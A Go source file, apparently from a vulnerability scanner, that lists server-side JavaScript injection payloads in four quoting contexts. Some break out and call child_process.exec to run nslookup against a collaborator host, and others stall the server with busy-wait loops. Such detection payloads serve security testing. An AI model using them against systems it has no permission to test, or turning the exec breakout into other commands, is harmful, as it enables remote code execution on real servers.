package server_side_js_injection

import "fmt"

// oastPayloads perform an out-of-band request from the Node.js runtime. Each is
// shipped in the same four quoting contexts as the timing payloads so the callback
// fires whether the injection lands raw or inside a single/double-quoted string. The
// %s placeholder is the collaborator host.
var oastPayloads = []string{
	`require('child_process').exec('nslookup '+'%s')`,
	`'+require('child_process').exec('nslookup '+'%s')+'`,
	`"+require('child_process').exec('nslookup '+'%s')+"`,
	`require('dns').lookup('%s',function(){})`,
}

// jsTimePayload is a busy-wait payload in one quoting context. The %d placeholder is
// the busy-wait duration in milliseconds; the $$ sentinel makes the loop fire once
// per evaluation rather than once per document/row.
type jsTimePayload struct {
	context  string
	template string // one %d for the busy-wait milliseconds
}

// render substitutes the busy-wait duration.
func (p jsTimePayload) render(ms int) string {
	return fmt.Sprintf(p.template, ms)
}

// timePayloads cover the four quoting contexts server-side JS injection lands in:
// unquoted (direct concatenation into code), single- and double-quoted string
// breakouts, and a statement-terminating context. Inner string quotes are chosen to
// not collide with the breakout quote.
var timePayloads = []jsTimePayload{
	{context: "unquoted", template: `(function(){if(typeof $$==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<%d);$$=1;}}())`},
	{context: "single-quote", template: `'+(function(){if(typeof $$==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<%d);$$=1;}}())+'`},
	{context: "double-quote", template: `"+(function(){if(typeof $$==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<%d);$$=1;}}())+"`},
	{context: "statement", template: `1);if(typeof $$==="undefined"){a=new Date();do{b=new Date();}while(b-a<%d);}$$=1;//`},
}
